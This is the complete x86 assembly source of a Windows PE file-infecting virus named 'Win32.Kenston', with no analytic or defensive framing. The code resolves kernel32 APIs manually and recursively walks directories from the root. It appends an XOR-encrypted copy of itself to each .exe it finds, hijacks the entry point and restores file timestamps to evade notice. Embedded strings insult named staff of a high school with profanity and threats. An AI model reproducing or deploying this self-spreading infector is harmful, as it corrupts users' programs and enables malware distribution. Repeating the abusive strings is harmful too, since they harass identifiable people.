Win32.Kenston
.386
locals
jumps
.model flat, STDCALL

extrn ExitProcess : PROC

org 1000h
.data
     db "This is a virus.",0

.code
progstart:
        push 0
        call ExitProcess


STARTVIRUS:

        call relativity
relativity:
        pop ebp
        cld
        mov eax, ebp

        db 2dh                          ;sub eax,
SaveEntry dd (offset relativity- offset progstart)
        push eax
        sub ebp, offset relativity

        mov ecx, dword ptr [esp + 4]
        and ecx, 0FFF00000h
        mov ebx, 0BFF70000h            ;Base address of win95's kernel
        cmp ecx, 0BFF00000h            ;are we win95 or 98?
        je vulnerable
        mov ebx, 077f00000h
        cmp ecx, ebx                   ;are we NT?
        jne exit


vulnerable:

        mov ecx, ebx
        mov edx, ecx                            ;Put imagebase in edx
        mov dword ptr [ebp + imagebase], ecx    ;Save the imagebase

        xor eax, eax                            ;Clear eax
        mov ax, word ptr [edx + 3Ch]            ;Get relocation in MZ header
        add ecx, eax                            ;Make ecx start of PE header

        cmp word ptr [ecx], 'EP'                ;Is everything working right?
        jne exit

        mov eax, dword ptr [ecx + 120]         ;Get RVA of export table

        add eax, edx                           ;Add on the Imagebase
        mov dword ptr [ebp + offset ExportTable], eax   ;Save the exporttable's address

        mov ecx, dword ptr [eax + 24]          ;Get number of entry's
        dec ecx                                ;Drop number by one so bottom loop works
        mov dword ptr [ebp + offset NumExports], ecx ;Store number of entrys

        mov ecx, dword ptr [eax + 28]          ;Get RVA of the Address Table
        add ecx, edx                           ;Bias it by the Image Base
        mov dword ptr [ebp + offset AddressTable], ecx ;Save the address

        mov ecx, dword ptr [eax + 36]          ;Get RVA of the Ordinal Table
        add ecx, edx                           ;Bias it by the Image Base
        mov dword ptr [ebp + offset OrdinalTable], ecx ;Save the address

        mov ecx, dword ptr [eax + 32]          ;Get RVA of the Name Table
        add ecx, edx                           ;Bias it by the Image Base
        mov dword ptr [ebp + offset NameTable], ecx ;Save the address

                ;Upon entry:
                ;           ecx=start of RVA String table
                ;           edx=imagebase
                ;           ebx=start of string of function to resolve
                ;Returns:
                ;           ebx=Address of function

        lea ebx, [ebp + offset LoadLibraryaS] ;Function to scan for
        push ecx    ;Save start of RVA name table
        call resolveexport  ;Resolve LoadLibraryA


        pop ecx
        mov dword ptr [ebp + offset loadlibrarya], ebx ;Save address of loadlibrarya

        lea ebx, [ebp + GetProcAddressS]     ;Load address of function to resolve
        call resolveexport  ;Resolve getprocaddress
        mov dword ptr [ebp + offset getprocaddress], ebx  ;Save getprocaddress


        lea esi, [ebp + offset APIList]       ;Where function strings are started
        lea edi, [ebp + offset FindFile]      ;Where to store resolved address's
        call maketable

        lea ebx, [ebp + offset DirSave]
        push ebx
        push 256
        mov ebx, [ebp + offset GetCurrentDir]
        call ebx
        cmp eax, 00h
        je exit              ;If not successfull then quit

        lea ebx, [ebp + offset Root]   ;Go to the root directory
        push ebx
        mov ebx, dword ptr [ebp + offset SetCurrentDir]
        call ebx
        cmp eax, 01           ;Were we sucessfull?
        jne exit              ;If not then exit

        call InfectFirstDirectory

        lea ebx, [ebp + offset DirSave]   ;Go to the original directory
        push ebx
        mov ebx, dword ptr [ebp + offset SetCurrentDir]
        call ebx

exit:
        pop eax                               ;Return to host
        jmp eax


InfectFirstDirectory:
        lea ebx, [ebp + offset win32_file_data]
        push ebx
        lea ebx, [ebp + offset DirWildCard]
        push ebx
        mov ebx, dword ptr [ebp + offset FindFile]
        call ebx
        cmp eax, -1
        je DoneDirScanning
        mov dword ptr [ebp + offset DirSearchHandle], eax  ;Save our search handle

        cmp dword ptr [ebp + offset fileattr], 10h
        jne NotADir1
        cmp byte ptr [ebp + offset Fullname], '.'
        je InfectNextDirectory


        call TryInfectingDir   ;Try infecting the possible directory
NotADir1:

InfectNextDirectory:

        lea ebx, [ebp + offset win32_file_data]     ;Where to store fileinfo
        push ebx
        push dword ptr [ebp + offset DirSearchHandle]
        mov ebx, dword ptr [ebp + offset FindNext]
        call ebx                                ;Find next file

        cmp eax, 01
        jne DoneDirScanningNoneFound

        cmp dword ptr [ebp + offset fileattr], 10h
        jne NotADir2
        cmp byte ptr [ebp + offset Fullname], '.'
        je NotADir2

        call TryInfectingDir
NotADir2:
        jmp InfectNextDirectory


DoneDirScanning:

        push dword ptr [ebp + offset DirSearchHandle]   ;Close the search handle
        mov eax, [ebp + offset FindClose]
        call eax

DoneDirScanningNoneFound:
        ret

TryInfectingDir:

        lea ebx, [ebp + offset FullName]   ;Go to the dir we found
        push ebx
        mov ebx, dword ptr [ebp + offset SetCurrentDir]
        call ebx
        cmp eax, 01           ;Was it really a directory?
        jne NotaDirectory      ;If not dont infect it or drop out of it

        call FindFirstFile

        push dword ptr [ebp + offset DirSearchHandle]
        call InfectFirstDirectory
        pop dword ptr [ebp+ offset DirSearchHandle]

        lea ebx, [ebp + offset DotDot]   ;We are going to the previous dir
        push ebx
        mov ebx, dword ptr [ebp + offset SetCurrentDir]
        call ebx
NotaDirectory:
        ret






FindFirstFile:

        lea ebx, [ebp + offset win32_file_data] ;Where file info goes
        push ebx
        lea ebx, [ebp + offset EXEWildcard]     ;What to search for
        push ebx
        mov ebx, dword ptr [ebp + offset FindFile]        ;Find first file
        call ebx

        cmp eax, -1                             ;Error?
        je ExitScanning
        mov dword ptr [ebp + offset SearchHandle], eax  ;Save search handle

        jmp check_file

FindNextFile:

        lea ebx, [ebp + offset win32_file_data]     ;Where to store fileinfo
        push ebx
        push dword ptr [ebp + offset SearchHandle]   ;Saved search handle
        mov ebx, dword ptr [ebp + offset FindNext]
        call ebx                                ;Find next file


        cmp eax, 01
        jne DoneScanning


check_file:


        push 0
        push 20h
        push 3                         ;Open existing file
        push 0
        push 0
        push 80000000h + 40000000h     ;Open for reading and writing
        lea ebx, [ebp + offset fullname]
        push ebx
        mov ebx, dword ptr [ebp + offset Createfile]
        call ebx

        cmp eax, -1                    ;Was there any error?
        je FindNextFile

        mov dword ptr [ebp + FileHandle], eax   ;Save file handle

        xor eax, eax
        lea edi, [ebp + offset WorkBuffer + 56] ;Go to memory to initalize
        stosd
        stosd      ;This fixes a very lame bug, It should really zero out the
                   ;whole workbuffer before each file
                   ;is read but since its a runtime virus its written
                   ;for efficency.


        mov edx, 63                    ;Read in first 63 bytes
        lea ecx, [ebp + offset WorkBuffer]  ;Buffer we read into
        call Read_file

        cmp dword ptr [ebp + offset BytesRead], 63
        jb TryNext                     ;Did we read in enough?

        lea ebx, [ebp + offset WorkBuffer]
        cmp word ptr [ebx], 'ZM'           ;Is it an exe?
        jne TryNext                        ;If it isnt scan next file

        add ebx, 3Bh                       ;Go to the infection marker

        cmp byte ptr [ebx], 'a'            ;are we infected already?
        je TryNext                         ;If so try next file
        inc ebx                            ;Point to relocation
        mov edx, dword ptr [ebx]           ;Read the relocation

        mov dword ptr [ebp + offset MZReloc], edx  ;Save the relocation

        call Set_Pointer                   ;Set file pointer to PE header

        cmp eax, 0FFFFFFFFh
        je TryNext

        mov edx, 120                    ;Try to read in first 120 bytes of PE Header
        lea ecx, [ebp + offset WorkBuffer]  ;Buffer we read into
        call Read_file
        cmp dword ptr [ebp + offset BytesRead], 120
        jne TryNext                     ;Did we read in enough?

        cmp word ptr [ebp + offset WorkBuffer], 'EP'  ;Are we in in the peheader?
        jne TryNext

        mov ebx, dword ptr [ebp + offset HeaderSze]    ;Get the HeaderSize
        sub ebx, dword ptr [ebp + offset MZReloc]  ;Subtract the MZ header
        mov dword ptr [ebp + offset HeaderSize], ebx  ;Save the PE header's size

        cmp ebx, 3000                ;Are we going to overflow our memory?
        ja TryNext
        push ebx                     ;Save number of bytes to read in

        mov edx, dword ptr [ebp + offset MZReloc] ;Reset pointer back to the peheader
        call Set_Pointer

        cmp eax, 0FFFFFFFFh
        je TryNext

        pop edx                          ;Try to read in HeaderSize bytes
        lea ecx, [ebp + offset WorkBuffer]  ;Buffer we read into
        call Read_file

        mov ebx, dword ptr [ebp + offset Headersize]   ;How many bytes should have been read?
        cmp ebx, dword ptr [ebp + offset BytesRead]
        jne TryNext                     ;Did we read in enough?

        xor ecx, ecx
        mov cx, word ptr [ebp + offset NumObjects] ;Read in number of objects

        cmp cx, 00h                                    ;Are there objects?
        je TryNext

        xor ebx, ebx
        mov bx, word ptr [ebp + offset NTHeaderSze]  ;Read in the NTHeaderSize
        add ebx, 24                                      ;Add on the rest

        lea edx, dword ptr [ebp + offset WorkBuffer]
                          ;Workbuffer + NTHeadersize + 24 = start of object table
        add edx, ebx                        ;Locate the object table

        push edx                            ;Save start of object table
        xor edx, edx
        mov eax, ecx                        ;Handoff # of objects
        mov ecx, 40                         ;Each object is 40 bytes long
        mul ecx                             ;# objects * 40
        sub eax, 40                         ;Backtrack to start of last object

        pop edx            ;Make edx the start of the object table in memory

        add edx, eax                      ;Point edx to last object

        mov ebx, dword ptr [edx + 20]   ;Load the Physical Offset
        push ebx                        ;Save for use with virtual size
        mov eax, dword ptr [edx + 16]   ;Load the Physical Size
        add ebx, eax          ;Add them together
        mov edi, dword ptr [ebp + offset FileSize]  ;Wont work if file is larger than 4.3 gigs...oh well

        add edi, (offset EndVirus - offset StartVirus) + (offset Encryptionframe - offset Encrypt) ;Put on the virussize of our virus in memory

        sub edi, ebx          ;Determine distance from end of virus to old end of object
        add eax, edi          ;Make our new physical size

        mov ebx, eax
        sub ebx, (offset EndVirus- offset StartVirus) + (offset Encryptionframe - offset Encrypt)

        mov esi, dword ptr [edx + 12]  ;Get RVA for determining entrypointRVA
        add esi, ebx        ;Find out our entrypointRVA


        mov dword ptr [ebp + offset VirusRVA], esi  ;Save the virus's RVA

        add esi, dword ptr [ebp + offset ImgBase] ;Make the Entrypoint RVA the EntrypointVA
        add esi, (offset EncryptionFrame - offset Encrypt)  ;Make it point to the encrypted virus in memory
        mov dword ptr [ebp + offset VirusVA], esi  ;Save the VA for later

        mov ecx, dword ptr [ebp + offset FileAlign]     ;Get our alignment value

;        call File_Align       ;Aligns eax

        mov dword ptr [edx + 16], eax    ;Save our new physical size

        pop ebx                         ;Load the physical offset
        mov eax, dword ptr [edx + 8]    ;Load the virtual size
        add ebx, eax                    ;Determine end of virtual space
        mov edi, dword ptr [ebp + offset FileSize]
        add edi, (offset BufferEnd - offset StartVirus) + (offset EncryptionFrame - offset Encrypt) ;Add the virus and its heap to it

        sub edi, ebx    ;Determine distance between end of virus's heap and end of virtual space

        add edi, eax    ;Make our virtual size

        mov dword ptr [edx + 8], edi  ;Save our new virtualsize

        mov ecx, dword ptr [edx + 12]  ;Get the objects RVA
        add ecx, edi                   ;Make our new ImageSize
        mov dword ptr [ebp + offset ImageSize], ecx  ;Save our new Imagesize

        mov dword ptr [edx + 36], 0E0000040h  ;Fix the flags

        ;We do all the dispatcher and loading shit here
        mov ecx, dword ptr [ebp + offset EntrypointRVA]

        mov eax, dword ptr [ebp + offset VirusRVA]
        mov dword ptr [ebp + offset EntrypointRVA], eax

        sub eax, ecx

        add eax, (offset relativity - offset startvirus) + (offset EncryptionFrame - offset Encrypt) ;Makeup for the call instruction

        mov dword ptr [ebp + offset SaveEntry], eax

        mov edx, 3Bh                    ;Offset we write marker byte at

        call Set_Pointer                ;Go to place to write marker

        mov ebx, 1h                     ;Write one byte
        lea ecx, dword ptr [ebp + offset InfectionMarker]   ;The byte to write
        call Write_File                 ;Write the infection marker

        mov edx, dword ptr [ebp + offset MZReloc]
        call Set_Pointer                ;Goto the start of the peheader

        mov ebx, dword ptr [ebp + offset BytesRead]  ;How much to write
        lea ecx, [ebp + offset WorkBuffer] ;Write our modified PE header
        call Write_File                 ;Write it!


        lea esi, [ebp + offset StartVirus]    ;Copy the virus to the work buffer to encrypt
        lea edi, [ebp + offset WorkBuffer]    ;Where to copy it
        mov dword ptr [ebp + offset StartEncrypt], edi ;We use this below

        mov ecx, (offset EndVirus - offset StartVirus)    ;How much to copy
        rep movsb

        inc byte ptr [ebp + offset Key]   ;Change the key

        Call Encrypt                      ;Encrypt our code

        mov ebx, dword ptr [ebp + VirusVA]    ;Get our Entrypoint VA
        mov dword ptr [ebp + offset StartEncrypt], ebx  ;Store it in the routine

        xor edx,edx
        call Set_EOF                    ;Go to EOF

        mov ebx, (offset EncryptionFrame - offset Encrypt)  ;Size of encryption routine to write
        lea ecx, [ebp + offset Encrypt]   ;Write encryption routine
        call Write_File

        mov ebx, (offset EndVirus - offset StartVirus) ;Size of the virus to write
        lea ecx, [ebp + offset WorkBuffer] ;Where the encrypted virus is in memory
        call Write_File                    ;Write the virus

        lea ebx, [ebp + offset LastWriteTime]    ;Get ptr to last writetime
        push ebx
        sub ebx,8              ;Point it to lastaccesstime
        push ebx
        sub ebx, 8             ;Point it to createtime
        push ebx
        push dword ptr [ebp + offset FileHandle]   ;Push on the file handle
        mov ebx, dword ptr [ebp + offset SetFileTime]
        call ebx               ;Change the file's times

        call Close_File



DoneScanning:

       push dword ptr [ebp + offset SearchHandle]
       mov eax, [ebp + offset FindClose]
       call eax


ExitScanning:

       ret

TryNext:

        call Close_File

        jmp FindNextFile

Read_File:

        push 0
        lea ebx, [ebp + offset BytesRead]  ;Where to put # of bytes read
        push ebx

        push edx        ;Number of bytes to read
        push ecx        ;Address of buffer
        push dword ptr [ebp + offset FileHandle]
        mov ebx, dword ptr [ebp + offset ReadFile]
        call ebx        ;Read the file

        ret

Write_File:
        push 0
        lea eax, [ebp + offset BytesWritten]
        push eax        ;Where to return # of bytes written

        push ebx        ;# of bytes to write
        push ecx        ;Where to write from
        push dword ptr [ebp + offset FileHandle]
        mov ebx, dword ptr [ebp + offset WriteFile]
        call ebx
        ret


                ;Upon Entry:
                ;         edx=New actual address in file


Set_EOF:
        push 02h
        jmp jumpover
Set_Pointer:
        push 00

jumpover:

        push 0
        push edx           ;Where to go in file
        push dword ptr [ebp + offset FileHandle]
        mov ebx, [ebp + offset SetFilePointer]
        call ebx
        ret



File_Align:

        ;Upon entry ecx = alignment value
        ;eax = Size to process
        ;eax returns aligned size
        push edx
        xor edx, edx
        div ecx
        inc eax
        mul ecx

        pop edx
        ret

Close_File:

        push dword ptr [ebp + offset FileHandle]
        mov eax, dword ptr [ebp + offset CloseFile]
        call eax   ;Close the file
        ret


        ;Upon entry:
        ;           esi=Function string table.
        ;           edi=Our address table.


maketable:

        lea ebx, [ebp + offset loadlibrarya]
        push esi                  ;Next in string table
        call dword ptr [ebx]      ;call loadlibrarya
        mov edx, eax              ;Save module handle

loopuntilnull:

        inc esi
        cmp byte ptr [esi], 00h
        jne loopuntilnull         ;loop until at end of string
        inc esi
        cmp byte ptr [esi], 01h    ;Are we on last loop?
        je donelooping


        lea ebx, [ebp + offset GetProcAddress]

        push edx
        push esi                  ;pointer to function name
        push edx                  ;base address of dll
        call dword ptr [ebx]     ;Getprocaddress in import table
        pop edx
        stosd
        jmp loopuntilnull

donelooping:

        ret






resolveexport:
                ;Upon entry:
                ;           ecx=start of RVA String table
                ;           edx=imagebase
                ;           ebx=start of string of function to resolve
                ;Returns:
                ;           ebx=Address of function

        xor edi,edi

scanstring:
        mov esi, dword ptr [ecx]         ;Load RVA of string to scan
        add esi, edx   ;Bias it by the Imagebase

        push ebx                         ;Bad way to save ebx for later use

scanloop:
        lodsb

        cmp al, 00h                             ;Is it a null character?
        je foundstring
        cmp byte ptr [ebx], al                  ;Does the character match?
        jne scannext                            ;If not scan next string

        inc ebx                                 ;Advance the byte we are
                                                ;scanning for.
        jmp scanloop
scannext:
        pop ebx
        add ecx, 4                              ;Move it to the next export?
        inc edi                                 ;Increment the counter
        cmp dword ptr [ebp + NumExports], edi   ;Are we on last export?
        je exit                                 ;Abort if out of exports

        jmp scanstring

foundstring:
        pop ebx                            ;Keep the stack nice and neat

        add edi, edi                       ;Multiply by 2 because Ordinal
                                           ;Table is 16 bits
        mov ebx, dword ptr [ebp + OrdinalTable]
        add edi, ebx                       ;Point edi to getprocaddress's entry

        xor ebx, ebx
        mov bx, word ptr [edi]             ;Get 16bit ordinal number

        lea ebx, [ebx * 4]                 ;Multiply by 4 because the Address
                                           ;table is made of double words.
        mov esi, dword ptr [ebp + AddressTable]
        add esi, ebx         ;Point esi to RVA in addresstable

        mov ebx, dword ptr [esi]        ;Move RVA to ebx
        add ebx, edx                    ;Offset it with the imagebase

        ret

Encrypt:
        mov ecx, (offset EndVirus - offset StartVirus)

        db 0BBh   ;Mov ebx,
StartEncrypt dd 000000000h
        db 0B0h   ;mov al,
Key     db 00h


XorLoop:
       xor byte ptr [ebx], al
       inc ebx
       dec ecx
       cmp ecx, 00h
       jne XorLoop
EncryptionFrame:
       ret

STARTDATA:
         ;We use these to find functions in KERNEL32.DLL's export table
        LoadLibraryAS   db "LoadLibraryA"
        GetProcAddressS db "GetProcAddress"

         ;These are the functions we need to get the address's of:
APIList:
             db "KERNEL32",0
             db "FindFirstFileA",0
             db "FindNextFileA",0
             db "FindClose",0
             db "SetFileAttributesA",0
             db "SetFileTime",0
             db "CreateFileA",0
             db "ReadFile",0
             db "WriteFile",0
             db "SetFilePointer",0
             db "CloseHandle",0
             db "SetCurrentDirectoryA",0
             db "GetCurrentDirectoryA",0,01h  ;01h stops the looking up


          db  "Boles and Manning are arrogant facists."
          db  "  They have no computer sk1llz and KENSTON HIGH SCHOOL's"
          db  "  computers are 0wn3d.  I AM BACK KOONS YOU MOTHERFUCKER "
          db  "dowN wiTh KenSTON..... yOU tRIED tO rID yOUrSELf oF mE BefoRE"
          db  "bUT fAILED"
          db  "HAHAHAHAHAHAHAHAHAHAHAHAHAHAHA"

        DirWildcard db "*.",0
        EXEWildcard db "*.exe",0
        InfectionMarker db "a"
        DotDot         db "..",0
        root           db "",0

ENDVIRUS:

           ;These are addresses already offseted by the Image base when saved
         ImageBase      dd 1 dup (?)
         ExportTable    dd 1 dup (?)
         AddressTable   dd 1 dup (?)
         NameTable      dd 1 dup (?)
         OrdinalTable   dd 1 dup (?)
         NumExports     dd 1 dup (?)
         GetProcAddressCall dd 1 dup (?)


           ;These are used in infecting files
         BytesWritten   dd 1 dup (?)
         SearchHandle   dd 1 dup (?)
         DirSearchHandle dd 1 dup (?)
         FileHandle     dd 1 dup (?)
         BytesRead      dd 1 dup (?)
         MZReloc        dd 1 dup (?)
         HeaderSize     dd 1 dup (?)
         NTHeaderSize   dd 1 dup (?)
         VirusRVA       dd 1 dup (?)
         InfectCounter  dd 1 dup (?)
         VirusVA        dd 1 dup (?)

        ;Place to store the two routines used to look up the rest
         LoadLibraryA   dd 1 dup (?)
         GetProcAddress dd 1 dup (?)

          ;This becomes a table of these functions address's
        FindFile       dd 1 dup (?)
        FindNext       dd 1 dup (?)
        FindClose      dd 1 dup (?)
        SetAttrib      dd 1 dup (?)
        SetFileTime    dd 1 dup (?)
        CreateFile     dd 1 dup (?)
        ReadFile       dd 1 dup (?)
        WriteFile      dd 1 dup (?)
        SetFilePointer dd 1 dup (?)
        CloseFile      dd 1 dup (?)
        SetCurrentDir  dd 1 dup (?)
        GetCurrentDir  dd 1 dup (?)

        DirSave        db 256 dup (?)

win32_file_data:
        fileattr dd 1 dup (?)
        createtime dd 2 dup (?)
        lastaccesstime dd 2 dup (?)
        lastwritetime dd 2 dup (?)
        dd 1 dup (?)
        filesize dd 1 dup (?)
        resv dd 2 dup (?)
        fullname db 256 dup (?)
        realname db 256 dup (?)

WorkBuffer:

        Signature dd 1 dup (?)
        Cputype dw 1 dup (?)
        NumObjects dw 1 dup (?)
          dd 3 dup (?)
        NtHeaderSze dw 1 dup (?)
        Flags dw 1 dup (?)
          dd 4 dup (?)
        EntrypointRVA dd 1 dup (?)
          dd 2 dup (?)
        ImgBase dd 1 dup (?)
        Objectalign dd 1 dup (?)
        Filealign dd 1 dup (?)
          dd 4 dup (?)
        Imagesize dd 1 dup (?)
        Headersze dd 1 dup (?)

        db 3000 dup (?)
BufferEnd:

ends
end STARTVIRUS
